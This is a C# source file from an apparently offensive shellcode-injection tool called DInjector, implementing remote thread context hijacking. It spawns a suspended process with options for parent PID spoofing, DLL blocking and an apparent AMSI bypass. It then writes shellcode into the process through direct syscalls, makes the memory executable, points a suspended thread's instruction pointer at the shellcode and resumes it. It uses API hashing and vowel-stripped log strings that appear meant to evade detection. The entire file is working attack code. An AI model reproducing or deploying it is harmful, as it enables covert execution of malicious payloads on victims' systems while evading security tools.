using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class RemoteThreadContext
    {
        public static void Execute(byte[] shellcode, string processImage, int ppid = 0, bool blockDlls = false, bool am51 = false, bool debug = false)
        {
            #region CreateProcessA

            var pi = SpawnProcess.Execute(
                processImage,
                @"C:\Windows\System32",
                suspended: true,
                ppid: ppid,
                blockDlls: blockDlls,
                am51: am51);

            #endregion

            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr hProcess = pi.hProcess;
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtAllctVrtlMmry, PAGE_READWRITE");
            else
                throw new Exception($"(RemoteThreadContext) [-] NtAllctVrtlMmry, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (shellcode)

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtWrtVrtlMmry, shellcode");
            else
                throw new Exception($"(RemoteThreadContext) [-] NtWrtVrtlMmry, shellcode: {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtPrtctVrtlMmry, PAGE_EXECUTE_READ");
            else
                throw new Exception($"(RemoteThreadContext) [-] NtPrtctVrtlMmry, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtCreateThreadEx (LoadLibraryA, CREATE_SUSPENDED)

            // { API_HASHING:LoadLibraryA }
            IntPtr loadLibraryAddr = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "243c5fb5414824f67ba55026610e87ce", 0x78243fad);

            IntPtr hThread = IntPtr.Zero;

            ntstatus = Syscalls.NtCreateThreadEx(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                loadLibraryAddr,
                IntPtr.Zero,
                true, // CREATE_SUSPENDED
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtCrtThrdEx, LoadLibraryA, CREATE_SUSPENDED");
            else
                throw new Exception($"(RemoteThreadContext) [-] NtCrtThrdEx, LoadLibraryA, CREATE_SUSPENDED: {ntstatus}");

            #endregion

            #region NtGetContextThread

            Registers.CONTEXT64 ctx = new Registers.CONTEXT64();
            ctx.ContextFlags = Registers.CONTEXT_FLAGS.CONTEXT_CONTROL;

            ntstatus = Syscalls.NtGetContextThread(
                hThread,
                ref ctx);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtGtCntxtThrd");
            else
                throw new Exception($"(RemoteThreadContext) [-] NtGtCntxtThrd: {ntstatus}");

            #endregion

            #region NtSetContextThread

            ctx.Rip = (UInt64)baseAddress;

            ntstatus = Syscalls.NtSetContextThread(
                hThread,
                ref ctx);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtStCntxtThrd");
            else
                throw new Exception($"(RemoteThreadContext) [-] NtStCntxtThrd: {ntstatus}");

            #endregion

            #region NtResumeThread

            uint suspendCount = 0;

            ntstatus = Syscalls.NtResumeThread(
                hThread,
                ref suspendCount);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtRsmThrd");
            else
                throw new Exception($"(RemoteThreadContext) [-] NtRsmThrd: {ntstatus}");

            #endregion

            Syscalls.NtClose(hThread);
            Syscalls.NtClose(hProcess);
        }
    }
}